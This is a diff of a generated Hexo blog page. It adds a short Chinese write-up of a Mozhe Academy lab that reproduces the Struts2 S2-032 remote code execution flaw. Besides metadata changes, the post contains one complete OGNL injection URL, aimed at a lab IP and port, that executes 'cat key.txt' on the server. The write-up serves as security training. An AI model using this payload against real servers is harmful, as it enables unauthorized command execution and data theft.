@@ -3,7 +3,7 @@
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   <title>82、Struts2远程代码执行漏洞（S2-032）复现 | Hexo</title>
-  <meta name="keywords" content>
+  <meta name="keywords" content=" 手工 ">
   <meta name="description" content="82、Struts2远程代码执行漏洞（S2-032）复现 | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简介东软学院的一条咸鱼 为什么加载图片这么慢：因为我用的是学生云（还跑着脚本）">
@@ -166,7 +166,7 @@
     <div><a style="border-right: 1px solid #fff; width: 49%"  class="about site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="85">
-<input type="hidden" id="yelog_site_word_count" value="6.4k">
+<input type="hidden" id="yelog_site_word_count" value="6.7k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -903,7 +903,7 @@
         
         <a  class="墨者学院 "
            href="/2019/08/15/82、Struts2远程代码执行漏洞（S2-032）复现/"
-           data-tag=""
+           data-tag="手工"
            data-author="" >
             <span class="post-title" title="82、Struts2远程代码执行漏洞（S2-032）复现">82、Struts2远程代码执行漏洞（S2-032）复现</span>
             <span class="post-date" title="2019-08-15 17:39:36">2019/08/15</span>
@@ -911,7 +911,7 @@
         
         <a  class="墨者学院 "
            href="/2019/08/15/83、Struts2远程代码执行漏洞（S2-037）复现/"
-           data-tag=""
+           data-tag="Struts2"
            data-author="" >
             <span class="post-title" title="83、Struts2远程代码执行漏洞（S2-037）复现">83、Struts2远程代码执行漏洞（S2-037）复现</span>
             <span class="post-date" title="2019-08-15 17:39:39">2019/08/15</span>
@@ -919,7 +919,7 @@
         
         <a  class="墨者学院 "
            href="/2019/08/15/84、Struts2远程代码执行漏洞（S2-016）复现/"
-           data-tag=""
+           data-tag="Struts2"
            data-author="" >
             <span class="post-title" title="84、Struts2远程代码执行漏洞（S2-016）复现">84、Struts2远程代码执行漏洞（S2-016）复现</span>
             <span class="post-date" title="2019-08-15 17:39:42">2019/08/15</span>
@@ -927,7 +927,7 @@
         
         <a  class="墨者学院 "
            href="/2019/08/15/85、Struts2远程代码执行漏洞（S2-029）复现/"
-           data-tag=""
+           data-tag="Struts2"
            data-author="" >
             <span class="post-title" title="85、Struts2远程代码执行漏洞（S2-029）复现">85、Struts2远程代码执行漏洞（S2-029）复现</span>
             <span class="post-date" title="2019-08-15 17:39:44">2019/08/15</span>
@@ -976,15 +976,21 @@
         </span>
         
         
+        <span class="tag">
+            
+            <a href="javascript:" class="color3">手工</a>
+            
+        </span>
+        
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-15 17:39:36'>2019-08-15 17:39</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-15 17:43:28'>2019-08-15 17:39</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:0</span>
+        <span>字数:171</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1018,7 +1024,10 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>访问网页，根据题目，是出现了S2-032漏洞，当开启动态方法调用时，可以远程代码执行。访问下面链接，得到Key，(这个漏洞的前提是开启动态方法调用，默认是关闭的，很多网站都是关闭的)</p>
+<pre><code>219.153.49.228:41398&#x2F;memoindex.action&#x2F;memoindex.action&#x2F;memoindex.action&#x2F;memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=cat%20key.txt</code></pre>
+<p><img src="/2019/08/15/82、Struts2远程代码执行漏洞（S2-032）复现/1.png" alt></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证 </span>
     </div>
@@ -1028,10 +1037,10 @@
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>82、Struts2远程代码执行漏洞（S2-032）复现</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">0</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">171</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="qiandaizhi">qiandaizhi</a></p>
     <p><span class="copy-title">发布时间:</span>2019-08-15, 17:39:36</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-15, 17:39:36</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-15, 17:43:28</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/15/82、Struts2远程代码执行漏洞（S2-032）复现/" title="82、Struts2远程代码执行漏洞（S2-032）复现">http://qiandaizhi.com/2019/08/15/82、Struts2远程代码执行漏洞（S2-032）复现/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
